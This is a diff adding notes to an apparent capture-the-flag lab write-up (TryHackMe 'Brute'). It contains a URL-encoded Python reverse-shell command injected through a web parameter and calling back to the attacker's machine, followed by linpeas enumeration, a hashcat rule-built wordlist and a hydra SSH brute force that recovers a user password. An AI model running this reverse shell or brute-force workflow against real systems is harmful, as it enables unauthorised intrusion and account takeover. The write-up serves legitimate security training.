@@ -194,3 +194,49 @@ Thu May 22 09:06:33 2025 [pid 1973] ['uid=33(www-data) gid=33(www-data) groups=3
 
 http://10.10.122.127/welcome.php?c=export%20RHOST=%2210.8.28.108%22;export%20RPORT=4444;python3%20-c%20%27import%20sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(%22RHOST%22),int(os.getenv(%22RPORT%22))));[os.dup2(s.fileno(),fd)%20for%20fd%20in%20(0,1,2)];pty.spawn(%22sh%22)%27
 
+
+## run linpeas 
+nothing to catch  found user.txt in adrian home folder
+and
+
+www-data@ip-10-10-122-127:/home/adrian$ cat .reminder
+cat .reminder
+Rules:
+best of 64
++ exclamation
+
+""
+
+
+## create own wordlist
+                                                                                                                    
+┌──(kali㉿kali)-[~/Documents/THM/THM_Brute]
+└─$ cat rule.rule       
+$!
+                                                                                                                    
+┌──(kali㉿kali)-[~/Documents/THM/THM_Brute]
+└─$ cat list.txt 
+ettubrute
+                                                                                                                    
+┌──(kali㉿kali)-[~/Documents/THM/THM_Brute]
+└─$ hashcat --stdout list.txt -r /usr/share/hashcat/rules/best64.rule -r rule.rule > wordlist-out.txt
+
+## Brute adrian SSH account
+
+┌──(kali㉿kali)-[~/Documents/THM/THM_Brute]
+└─$ hydra -l adrian -P wordlist-out.txt 10.10.122.127  ssh                         
+
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-22 13:53:20
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 77 login tries (l:1/p:77), ~5 tries per task
+[DATA] attacking ssh://10.10.122.127:22/
+[22][ssh] host: 10.10.122.127   login: adrian   password: theettubrute!
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 2 final worker threads did not complete until end.
+[ERROR] 2 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-22 13:53:29
+
+## Get ssh credentials login: adrian   password: theettubrute!
